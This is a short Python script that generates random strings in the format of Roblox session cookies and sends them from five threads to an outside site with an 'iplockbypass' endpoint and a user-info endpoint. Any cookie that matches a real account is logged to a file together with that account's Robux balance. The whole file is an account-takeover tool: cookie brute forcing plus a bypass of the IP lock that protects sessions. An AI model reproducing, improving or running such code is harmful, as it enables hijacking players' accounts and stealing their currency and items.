import requests, json, re
import random, string
import threading

def process():
    while True:

        valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
        rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
        finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

        cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text

        r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
        data = r.json()

        if data["status"] == "failed":
            
            falsecookie = rancookie[:29]
            print("[INVALID] " + falsecookie + "...")

        elif data["status"] == "good":

            falsecookie = rancookie[:9]
            robuxamount = str(data['robux'])
            print(f"[VALID]" + falsecookie + f"... USERNAME: '{data['username']}' Robux: '{robuxamount}' Logged To File.")
            f = open("cookies.txt", "a")
            f.write(str(rancookie + " Robux: " + robuxamount + "\n"))
            f.close()

        else:
            exit()

t1 = threading.Thread(target=process)
t2 = threading.Thread(target=process)
t3 = threading.Thread(target=process)
t4 = threading.Thread(target=process)
t5 = threading.Thread(target=process)

t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
